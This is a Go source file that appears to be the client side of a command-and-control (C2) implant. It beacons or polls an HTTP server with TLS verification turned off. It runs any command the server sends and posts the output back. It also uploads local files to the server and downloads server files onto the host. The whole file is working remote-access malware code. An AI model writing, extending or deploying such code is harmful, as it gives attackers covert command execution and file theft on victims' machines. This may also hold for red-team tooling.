package clients

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"io/ioutil"
)

type HTTPClient struct {
	client *http.Client
	config ClientConfig
}

type ClientConfig struct {
	Mode           string
	URL            string
	BeaconData     []byte
	BeaconInterval time.Duration
}

func NewHTTPClient(config ClientConfig) *HTTPClient {
	return &HTTPClient{
		client: &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyFromEnvironment,
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		},
		config: config,
	}
}

func (h *HTTPClient) StartCommunication() {
	fmt.Println("[+] Starting communication with C2 server...")
	time.Sleep(time.Second * 2)
	switch h.config.Mode {
	case "session":
        fmt.Println("Starting session-based communication...")
		time.Sleep(time.Second * 2)

        h.StartSession()
	case "beacon":
		fmt.Println("Starting beaconing...")
		time.Sleep(time.Second * 2)

		h.StartBeaconing()
	default:
		fmt.Println("Invalid mode specified in configuration.")
		time.Sleep(time.Second * 2)
	}
}

func (h *HTTPClient) Read(url string) (string, error) {
	fmt.Println("[+] Calling to C2...", url)
	resp, err := h.client.Get(url)
	
	if err != nil {
		return "", fmt.Errorf("got error when requesting URL: %s", err)
	}
	

	body, err := ioutil.ReadAll(resp.Body)
	
	print ("Body: ", body)
	if err != nil {
		return "", fmt.Errorf("got error when reading response body: %s", err)
	}

	return strings.Trim(string(body), "\n\r"), nil
}


// ProcessCmd processes the given command and performs the corresponding action.
// It accepts a command string as input and executes the appropriate logic based on the command.
// If the command is "quit", the function will print a message and exit the program.
// If the command starts with "upload", the function will extract the local and remote file paths from the command
// and call the UploadFile function to upload the file from the local system to the remote server.
// If the command starts with "download", the function will extract the remote and local file paths from the command
// and call the DownloadFile function to download the file from the remote server to the local system.
// For any other command, the function will execute the command and send the output back to the server.
// The output is sent using an HTTP POST request to the cmdOutputURL defined in the HTTPClient configuration.
// If there is an error executing the command or sending the output, an error message will be printed.

func (h *HTTPClient) ProcessCmd(cmd string) { // Fix: Added closing parenthesis after 'cmd'
	const uploadFileURL, downloadFileURL, cmdOutputURL = "/upload", "/download", "/cmdOutput" // Define these URLs according to your API

	if strings.Compare(cmd, "quit") == 0 {
		fmt.Println("[+] Quitting due to quit cmd from c2")
		os.Exit(0)
	} else if strings.HasPrefix(cmd, "upload") {
		cmdTokens := strings.Split(cmd, " ")
		if len(cmdTokens) < 3 {
			fmt.Println("[-] Invalid upload command syntax.")
		} else {
			localFilePath := cmdTokens[1]
			remoteFilePath := cmdTokens[2]
			h.UploadFile(h.config.URL+uploadFileURL, localFilePath, remoteFilePath)
		}
	} else if strings.HasPrefix(cmd, "download") {
		cmdTokens := strings.Split(cmd, " ")
		if len(cmdTokens) < 3 {
			fmt.Println("[-] Invalid download command syntax.")
		} else {
			remoteFilePath := cmdTokens[1]
			localFilePath := cmdTokens[2]
			h.DownloadFile(h.config.URL+downloadFileURL+"?file="+remoteFilePath, localFilePath)
		}
	} else {
		// Execute the command and get output
		out, err := ExecAndGetOutput(cmd)
		if err != nil {
			fmt.Printf("[-] Error executing command: %s\n", err)
			// Optionally send the error back to C2
		} else {
			fmt.Printf("[+] Sending back output:\n%s\n", out)
			_, err := h.client.Post(h.config.URL+cmdOutputURL, "text/plain", bytes.NewBufferString(out))
			if err != nil {
				fmt.Println("[-] Error sending command output:", err)
			}
		}
	}
}

// UploadFile uploads a file from the local system to the remote server.
func (h *HTTPClient) UploadFile(url, localFilePath, remoteFilePath string) {
	file, err := os.Open(localFilePath)
	if err != nil {
		fmt.Printf("[-] Error opening file: %s\n", err)
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(remoteFilePath))
	if err != nil {
		fmt.Printf("[-] Error creating form file: %s\n", err)
		return
	}
	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Printf("[-] Error copying file content: %s\n", err)
		return
	}
	err = writer.Close()
	if err != nil {
		fmt.Printf("[-] Error closing writer: %s\n", err)
		return
	}

	req, err := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	if err != nil {
		fmt.Printf("[-] Error creating request: %s\n", err)
		return
	}

	resp, err := h.client.Do(req)
	if err != nil {
		fmt.Printf("[-] Error sending file: %s\n", err)
		return
	}
	defer resp.Body.Close()
	fmt.Println("[+] File uploaded successfully.")
}
func ExecAndGetOutput(cmd string) (string, error) {
    // Split the command string into command and arguments for exec.Command
    parts := strings.Fields(cmd)
    if len(parts) == 0 {
        return "", fmt.Errorf("empty command")
    }

    // The first part is the command, the rest are the arguments
    command, args := parts[0], parts[1:]

    // Execute the command
    output, err := exec.Command(command, args...).CombinedOutput()
    if err != nil {
        return "", fmt.Errorf("error executing command: %v, output: %s", err, output)
    }

    return string(output), nil
}


// DownloadFile downloads a file from the remote server to the local system.
func (h *HTTPClient) DownloadFile(url, localFilePath string) {
	resp, err := h.client.Get(url)
	if err != nil {
		fmt.Printf("[-] Error downloading file: %s\n", err)
		return
	}
	defer resp.Body.Close()

	// Ensure directory structure for localFilePath exists
	localDir := filepath.Dir(localFilePath)
	if err := os.MkdirAll(localDir, 0755); err != nil {
		fmt.Printf("[-] Error creating directories: %s\n", err)
		return
	}

	out, err := os.Create(localFilePath)
	if err != nil {
		fmt.Printf("[-] Error creating local file: %s\n", err)
		return
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		fmt.Printf("[-] Error saving downloaded file: %s\n", err)
		return
	}
	fmt.Println("[+] File downloaded successfully.")
}

/*func (h *HTTPClient) Write(url string, payload []byte) ([]byte, error) {
	resp, err := h.client.Post(url, "application/json", bytes.NewBuffer(payload))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return body, nil
}*/
func (h *HTTPClient) StartSession() {
	// Example of a simple session loop
	for {
		// Here you might want to GET or POST to check for commands
		response, err := h.Read(h.config.URL)
		if err != nil {
			fmt.Println("Error in session-based communication:", err)
		} else {
			fmt.Println("Session response:", response)
			// Process any commands or data contained in the response
			h.ProcessCmd(response)
		}
		
		// Wait a bit before checking in again
		time.Sleep(h.config.BeaconInterval)
	}
}

/*
func (h *HTTPClient) StartBeaconing() {
	ticker := time.NewTicker(h.config.BeaconInterval)
	quit := make(chan struct{})
	go func() {
		for {
			select {
			case <-ticker.C:
				if len(h.config.BeaconData) == 0 {
					// Send a GET request
					response, err := h.Read(h.config.URL)
					if err != nil {
						fmt.Println("Error beaconing (GET):", err)
					} else {
						h.ProcessCmd(response)
					}
				} else {
					// Send a POST request with beacon data
					_, err := h.Write(h.config.URL, h.config.BeaconData)
					if err != nil {
						fmt.Println("Error beaconing (POST):", err)
					}
				}
			case <-quit:
				ticker.Stop()
				return
			}
		}
	}()
}
*/
func (h *HTTPClient) StartBeaconing() {
	ticker := time.NewTicker(h.config.BeaconInterval)
	quit := make(chan struct{})
	go func() {
		for {
			select {
			case <-ticker.C:
				if len(h.config.BeaconData) == 0 {
					// No beacon data provided, just send a GET request to the server
					response, err := h.Read(h.config.URL)
					if err != nil {
						fmt.Println("Error beaconing (GET):", err)
					} else {
						fmt.Println("Beacon sent (GET), response:", response)
					}
				} else {
					// Send a POST request with beacon data
					resp, err := h.client.Post(h.config.URL, "text/plain", bytes.NewBuffer(h.config.BeaconData))
					if err != nil {
						fmt.Println("Error beaconing (POST):", err)
					} else {
						fmt.Println("Beacon sent (POST)")
						response, err := ioutil.ReadAll(resp.Body)
						resp.Body.Close()
						if err != nil {
							fmt.Println("Error reading server response:", err)
						} else {
							fmt.Println("Server response:", string(response))
							h.ProcessCmd(string(response)) // Process command received from server
						}
					}
				}
			case <-quit:
				ticker.Stop()
				return
			}
		}
	}()
}

